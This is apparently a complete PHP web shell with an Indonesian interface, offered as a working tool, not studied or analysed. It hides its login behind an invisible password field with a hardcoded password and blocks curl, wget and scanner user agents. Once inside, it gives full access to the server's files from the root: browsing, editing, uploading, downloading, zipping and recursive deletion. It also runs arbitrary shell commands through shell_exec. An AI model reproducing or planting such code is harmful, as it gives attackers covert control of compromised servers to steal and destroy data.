<?php
session_start();

if (!isset($_SERVER['HTTP_USER_AGENT']) || preg_match('/curl|wget|scanner|bot/i', $_SERVER['HTTP_USER_AGENT'])) {
    die("403 Forbidden");
}

$valid_pass = "Seojunggle088";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $password = $_POST['password'] ?? '';

    if ($password === $valid_pass) {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    } else {
        $error_message = "Password salah!";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title></title>
        <style>
            body {
                background-color: white;
                margin: 0;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                position: relative;
            }
            form {
                position: absolute;
                top: 10px;
                right: 10px;
            }
            input[type="password"] {
                background-color: transparent;
                border: none;
                border-bottom: 2px solid transparent;
                padding: 5px 10px;
                font-size: 14px;
                color: transparent;
                transition: all 0.3s ease;
                outline: none;
                width: 150px;
                opacity: 0;
            }
            input[type="password"]:focus {
                background-color: white;
                border-bottom: 2px solid black;
                opacity: 1;
            }
            button {
                display: none;
            }
            .error {
                color: red;
                position: absolute;
                top: 50px;
                right: 10px;
                font-size: 14px;
            }
        </style>
    </head>
    <body>
        <form method="POST">
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <?php if (isset($error_message)): ?>
            <div class="error"><?= htmlspecialchars($error_message) ?></div>
        <?php endif; ?>
    </body>
    </html>
    <?php
    exit();
}

function getRootDir($dir) {
    while (dirname($dir) !== $dir) {
        $dir = dirname($dir);
    }
    return $dir;
}

$rootDir = getRootDir(__DIR__);

// Fungsi rekursif untuk menghapus folder beserta isinya
function deleteFolder($folderPath) {
    if (!is_dir($folderPath)) {
        return unlink($folderPath); // Jika bukan folder, hapus file
    }

    foreach (scandir($folderPath) as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $folderPath . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            deleteFolder($path); // Hapus subfolder
        } else {
            unlink($path); // Hapus file dalam folder
        }
    }
    return rmdir($folderPath); // Hapus folder setelah isinya kosong
}

// Handle file atau folder deletion
if (isset($_GET['delete'])) {
    $pathToDelete = urldecode($_GET['delete']);
    
    if (file_exists($pathToDelete)) {
        if (deleteFolder($pathToDelete)) {
            echo "<script>
            alert('\"$pathToDelete\" berhasil dihapus.');
            window.location.href = '?dir=" . urlencode(dirname($pathToDelete)) . "';
        </script>";
        
        } else {
            echo "<script>alert('Gagal menghapus \"$pathToDelete\".');</script>";
        }
    } else {
        echo "<script>alert('File atau folder tidak ditemukan.');</script>";
    }
}


// Handle file saving
if (isset($_POST['save'])) {
    $fileToEdit = urldecode($_POST['file']);
    if (file_put_contents($fileToEdit, $_POST['content']) !== false) {
        echo "<script>alert('File \"$fileToEdit\" berhasil diperbarui.');</script>";
        $content = htmlspecialchars(file_get_contents($fileToEdit));
    } else {
        echo "<script>alert('Gagal menyimpan perubahan.');</script>";
    }
}

// Handle file download
if (isset($_GET['download'])) {
    $fileToDownload = urldecode($_GET['download']);
    if (file_exists($fileToDownload)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($fileToDownload) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($fileToDownload));
        readfile($fileToDownload);
        exit;
    } else {
        echo "<script>alert('File tidak ditemukan.');</script>";
    }
}

if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["cmd"])) {
    $cmd = $_POST["cmd"];
    $output = shell_exec($cmd);

    // Pisahkan output ke dalam array baris
    $lines = explode("\n", trim($output));

    // Filter output agar hanya daftar file & folder
    $files = [];
    foreach ($lines as $line) {
        $columns = preg_split('/\s+/', trim($line), 4);

        // Hanya ambil baris yang memiliki 4 kolom dan bukan metadata sistem
        if (count($columns) === 4 && !preg_match('/^(Volume|Serial|bytes)/i', $columns[0])) {
            $files[] = $columns;
        }
    }

    // Kirim output dalam format HTML tabel
    if (!empty($files)) {
        echo "<table class='custom-shell-table'>";
        echo "<tr><th>Tanggal</th><th>Waktu</th><th>Ukuran</th><th>Nama</th></tr>";
        foreach ($files as $file) {
            echo "<tr>";
            echo "<td>{$file[0]}</td>"; // Tanggal
            echo "<td>{$file[1]}</td>"; // Waktu
            echo "<td>{$file[2]}</td>"; // Ukuran / <DIR>
            echo "<td>{$file[3]}</td>"; // Nama file/folder
            echo "</tr>";
        }
        echo "</table>";
    } else {
        echo "<p class='error-msg'>Tidak ada hasil yang ditampilkan.</p>";
    }
    exit;
}

if (isset($_GET['zip'])) {
    $path = realpath($_GET['zip']); // Mendapatkan path absolut
    if (!$path || !file_exists($path)) {
        die("File atau folder tidak ditemukan.");
    }

    $zipFile = tempnam(sys_get_temp_dir(), "zip"); // Buat file ZIP sementara
    $zip = new ZipArchive();
    
    if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        if (is_dir($path)) {
            addFolderToZip($path, $zip, basename($path)); // Kompres folder
        } else {
            $zip->addFile($path, basename($path)); // Kompres file
        }
        $zip->close();

        // Kirim file ZIP untuk diunduh
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . basename($path) . '.zip"');
        header('Content-Length: ' . filesize($zipFile));
        readfile($zipFile);
        unlink($zipFile); // Hapus file ZIP sementara setelah diunduh
        exit;
    } else {
        die("Gagal membuat ZIP.");
    }
}

// Fungsi untuk menambahkan folder ke ZIP
function addFolderToZip($folder, $zip, $baseFolder = '') {
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folder), RecursiveIteratorIterator::LEAVES_ONLY);
    
    foreach ($files as $file) {
        if (!$file->isDir()) {
            $filePath = $file->getRealPath();
            $relativePath = $baseFolder . '/' . substr($filePath, strlen($folder) + 1);
            $zip->addFile($filePath, $relativePath);
        }
    }
}


// Handle file upload
if (isset($_POST['upload'])) {
    $currentDir = isset($_GET['dir']) ? urldecode($_GET['dir']) : $rootDir; // Dapatkan direktori saat ini
    $target_dir = rtrim($currentDir, '/') . '/'; // Tentukan direktori tujuan
    $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
    $uploadOk = 1;

    // Membuat direktori jika belum ada
    if (!is_dir($target_dir)) {
        mkdir($target_dir, 0755, true);
    }

    // Memeriksa jika file sudah ada
    if (file_exists($target_file)) {
        echo "<script>alert('Maaf, file sudah ada.');</script>";
        $uploadOk = 0;
    }

    // Memeriksa ukuran file
    if ($_FILES["fileToUpload"]["size"] > 5000000) { // Batas ukuran file 5MB
        echo "<script>alert('Maaf, file terlalu besar.');</script>";
        $uploadOk = 0;
    }

    // Jika semua pemeriksaan lolos, upload file
    if ($uploadOk == 0) {
        echo "<script>alert('Maaf, file Anda tidak terupload.');</script>";
    } else {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<script>alert('File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " telah diupload ke folder " . htmlspecialchars($currentDir) . ".');</script>";
        } else {
            echo "<script>alert('Maaf, terjadi kesalahan saat mengupload file Anda.');</script>";
        }
    }
}

$currentDir = isset($_GET['dir']) ? urldecode($_GET['dir']) : $rootDir;
$files = scandir($currentDir);

$content = '';
$fileToView = '';
if (isset($_GET['file'])) {
    $fileToView = urldecode($_GET['file']);
    if (file_exists($fileToView)) {
        $content = htmlspecialchars(file_get_contents($fileToView));
    } else {
        die("File tidak ditemukan.");
    }
}

$isRootDir = ($currentDir === $rootDir);
$parentDir = dirname($currentDir);
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.min.css">
    <style>
        body {
            background: url('https://c4.wallpaperflare.com/wallpaper/52/465/301/illustration-landscape-digital-art-mountains-wallpaper-preview.jpg') no-repeat center center fixed;
            background-size: cover;
            font-family: monospace;
            color: #f1c40f;
        }
        .container {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 8px;
            margin: 20px;
            text-align: center;
        }
        .ascii-art {
            white-space: pre;
            font-size: 18px;
            line-height: 1.2;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #f1c40f;
        }
        th {
            background-color: #333;
        }
        a {
            color: #f1c40f;
        }
        .btn {
            color: #f1c40f;
            text-decoration: none;
            padding: 10px;
            border: 1px solid #f1c40f;
            border-radius: 5px;
            margin-right: 5px;
        }
        .btn:hover {
            background-color: #f1c40f;
            color: black;
        }
        pre {
            background-color: #444;
            padding: 10px;
            border-radius: 5px;
            color: #f1c40f;
        }
        #editForm {
            display: none;
            margin-top: 20px;
        }
        .custom-shell-table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 10px;
}

.custom-shell-table th,
.custom-shell-table td {
    border: 1px solid #ddd;
    padding: 8px;
    text-align: left;
}

.custom-shell-table th {
    background-color: #333;
    color: #fff;
}

.custom-shell-table tr:nth-child(even) {
    background-color: #2c2c2c;
}

.custom-shell-table tr:hover {
    background-color: #444;
}

.error-msg {
    color: red;
    font-weight: bold;
}


    </style>
</head>
<body>
    <div class="container">
        <div class="ascii-art">
            <pre>
                .--.         
               |o_o |        
               |:_/ |        
              //   \ \       
             (|     | )      
            /'\_   _/`\     
            \___)=(___/     

             ______  ______  ______  ______  ______  _____  _  _ 
            |  __  ||  __  ||  __  ||  __  ||  __  ||  _  || || |
            | |  | || |  | || |  | || |  | || |  | || | | || || |
            | |  | || |  | || |  | || |  | || |  | || | | || || |
            | |__| || |__| || |__| || |__| || |__| || |_| ||_||_|
            |______||______||______||______||______||_____/ (_)
            </pre>
        </div>

        <!-- Tombol Upload -->
        <form action="" method="post" enctype="multipart/form-data" style="margin-bottom: 20px;">
            <label class="btn" style="display: inline-block;">
                <i class="fas fa-upload"></i> Upload File
                <input type="file" name="fileToUpload" required style="display: none;">
            </label>
            <button type="submit" name="upload" class="btn"><i class="fas fa-cloud-upload-alt"></i> Kirim</button>
        </form>

        <?php if (!$isRootDir): ?>
            <a href="?dir=<?php echo urlencode($parentDir); ?>" class="btn"><i class="fas fa-arrow-up"></i> Kembali ke Direktori Atas</a>
        <?php endif; ?>

        <?php if (!$isRootDir): ?>
            <a href="?dir=<?php echo urlencode($rootDir); ?>" class="btn"><i class="fas fa-arrow-left"></i> Kembali ke Direktori Utama</a>
        <?php endif; ?>

        <?php if (empty($content)): ?>
            <table>
                <thead>
                    <tr>
                        <th>File</th>
                        <th>Aksi</th>
                    </tr>
                </thead>
                <tbody>
                <?php foreach ($files as $file): ?>
    <?php if ($file !== '.' && $file !== '..'): ?>
        <tr>
            <td><?php echo htmlspecialchars($file); ?></td>
            <td>
                <a href="?dir=<?php echo urlencode($currentDir . '/' . $file); ?>" class="btn">
                    <i class="fas fa-folder"></i> Buka
                </a>
                <a href="?delete=<?php echo urlencode($currentDir . '/' . $file); ?>" class="btn" 
                   onclick="return confirmDelete('<?php echo htmlspecialchars($file); ?>');">
                    <i class="fas fa-trash"></i> Hapus
                </a>
                <a href="?zip=<?php echo urlencode($currentDir . '/' . $file); ?>" class="btn">
                    <i class="fas fa-file-archive"></i> ZIP
                </a>
                <?php if (!is_dir($currentDir . '/' . $file)): ?>
                    <a href="?file=<?php echo urlencode($currentDir . '/' . $file); ?>" class="btn">
                        <i class="fas fa-eye"></i> Lihat
                    </a>
                    <a href="?download=<?php echo urlencode($currentDir . '/' . $file); ?>" class="btn">
                        <i class="fas fa-download"></i> Download
                    </a>
                <?php endif; ?>
            </td>
        </tr>
    <?php endif; ?>
<?php endforeach; ?>

                </tbody>
            </table>
        <?php else: ?>
            <h2>Lihat File: <?php echo htmlspecialchars(basename($fileToView)); ?></h2>
            <pre><?php echo $content; ?></pre>
            
            <form id="editForm" method="POST" action="">
                <input type="hidden" name="file" value="<?php echo htmlspecialchars($fileToView); ?>">
                <textarea name="content" rows="10" cols="80"><?php echo $content; ?></textarea><br>
                <button type="submit" name="save" class="btn"><i class="fas fa-save"></i> Simpan</button>
                <button type="button" class="btn" onclick="document.getElementById('editForm').style.display='none'"><i class="fas fa-times"></i> Batal</button>
            </form>
            <button class="btn" onclick="document.getElementById('editForm').style.display='block';"><i class="fas fa-edit"></i> Edit</button>
            <a href="?dir=<?php echo urlencode($currentDir); ?>" class="btn">Kembali</a>
        <?php endif; ?>
        <form id="cmdForm">
    <input type="text" id="cmdInput" placeholder="Masukkan perintah..." style="width: 80%;" required>
    <button type="submit">Eksekusi</button>
</form>
<div id="output"></div>
    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.min.js"></script>
    <script>
        function confirmDelete(file) {
            return confirm(`Anda yakin ingin menghapus file: ${file}?`);
        }
        $(document).ready(function () {
        $("#cmdForm").submit(function (e) {
            e.preventDefault();
            var command = $("#cmdInput").val();

            $.post("p.php", { cmd: command }, function (data) {
                $("#output").html(data); // Menampilkan hasil dalam div output
            });
        });
    });
    </script>
</body>
</html>